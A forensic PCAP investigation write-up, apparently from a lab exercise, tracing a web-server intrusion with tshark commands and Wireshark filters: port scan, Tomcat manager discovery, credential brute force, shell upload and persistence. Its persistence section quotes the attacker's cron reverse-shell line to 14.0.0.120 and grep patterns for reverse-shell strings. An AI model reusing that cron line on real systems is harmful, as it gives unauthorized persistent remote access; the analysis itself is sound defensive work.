
# Web Server Attack Analysis - PCAP Investigation Report

## 1. Identifying the Source IP Address (Attacker's IP)

### Commands to Identify Scanning Behavior:
```bash
# Get all unique source IPs (sorted by frequency)
tshark -r web.pcap -T fields -e ip.src | sort | uniq -c | sort -nr

# Find scanning behavior across various ports
tshark -r web.pcap -T fields -e ip.src -e tcp.dstport | sort | uniq | awk '{print $1}' | sort | uniq -c | sort -nr

# Focus on SYN scans (tcp.flags.syn==1 && tcp.flags.ack==0)
tshark -r web.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==0" -T fields -e ip.src | sort | uniq -c | sort -nr

# Top talkers
tshark -r web.pcap -q -z conv,ip
```

**Wireshark Filters:**
```
tcp.flags.syn == 1 && tcp.flags.ack == 0
```

**Wireshark Statistics:**
- Statistics → Endpoints → IPv4
- Statistics → Conversations → TCP

**Attacker IP:** `14.0.0.120`

## 2. Geographical Location of Attacker

```bash
whois 14.0.0.120
```

## 3. Open Ports and Web Server Admin Panel

### Commands to identify open ports and web activity:
```bash
# Open ports (SYN+ACK responses)
tshark -r web.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==1" -T fields -e tcp.dstport | sort | uniq -c | sort -nr

# HTTP requests by destination port
tshark -r web.pcap -Y "http.request" -T fields -e tcp.dstport | sort | uniq -c | sort -nr

# Manager directory discovery
tshark -r web.pcap -Y 'http.request.uri contains "manager"' -T fields -e ip.src -e tcp.dstport -e http.request.uri
```

**Wireshark Filters:**
```
ip.addr == 14.0.0.120 && http
tcp.flags == 0x012
http.request.uri contains "manager"
```

**Admin Panel Port:** Standard HTTP/HTTPS ports with `/manager/html` access

## 4. Directory/File Enumeration Tools

**Identified from HTTP requests:**
```
http.request.uri contains "manager"
```

```
tshark -r web.pcap -Y "http.request" -T fields -e http.request.uri | sort | uniq -c | sort -nr
tshark -r web.pcap -Y 'http.request.uri contains "manager"' -T fields -e ip.src -e http.request.uri
```

**Attacker enumerated:** `/manager/html` directory

## 5. Admin Panel Brute Force Credentials

### Commands:
```bash
# Extract HTTP Basic Auth
tshark -r web.pcap -Y "http.authorization" -T fields -e http.authorization
tshark -r web.pcap -Y "http.authorization" -T fields -e http.authorization | sort | uniq

# Successful login (HTTP 200)
tshark -r web.pcap -Y "http.response.code == 200" -T fields -e ip.src -e http.authorization
```

**Filter:** `http.authorization`

**Successful Credentials:** `[Extracted from Base64 encoded authorization header]`

## 6. Malicious File Upload (Reverse Shell)

### Commands:
```bash
# POST requests
tshark -r web.pcap -Y "http.request.method == POST" -T fields -e http.request.uri

# File data in POST
tshark -r web.pcap -Y "http.request.method == POST" -T fields -e http.file_data
tshark -r web.pcap -Y "http.request.method == POST" -T fields -e http.content_disposition

# Extract filename from file data
tshark -r web.pcap -Y "http.request.method == POST" -T fields -e http.file_data | xxd -r -p | strings | grep -i filename
```

**Filter:** `ip.src == 14.0.0.120 && http.request.method == POST`

## 7. Persistence Mechanism (Cron Job)

### Commands:
```bash
# Extract all data payloads
tshark -r web.pcap -T fields -e data | xxd -r -p | strings

# Search for cron/persistence commands
tshark -r web.pcap -T fields -e data | xxd -r -p | strings | grep -Ei "cron|crontab|\* \* \* \* \*"
tshark -r web.pcap -T fields -e data | xxd -r -p | strings | grep -E "/dev/tcp|nc |bash -i"
```

### Attacker Commands Observed:
```
whoami
root

cd /tmp
pwd
/tmp

echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'" > cron
crontab -i cron
crontab -l
```

**Persistence Cron Job:**
```
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
```

## Summary of Attack Chain:
1. **Port Scanning** → SYN scan from `14.0.0.120`
2. **Directory Enumeration** → Discovered `/manager/html`
3. **Credential Brute Force** → Successful admin login
4. **File Upload** → Reverse shell deployment
5. **Persistence** → Cron job for continuous C2

## Wireshark Key Filters Summary:
```
tcp.flags.syn == 1 && tcp.flags.ack == 0          # SYN Scan
ip.addr == 14.0.0.120 && http                     # Attacker HTTP traffic
http.request.uri contains "manager"               # Admin panel discovery
http.authorization                                # Credential brute force
http.request.method == POST                       # File upload
```
```

This markdown file provides a complete analysis guide with all the tshark commands, Wireshark filters, and expected findings from the PCAP analysis.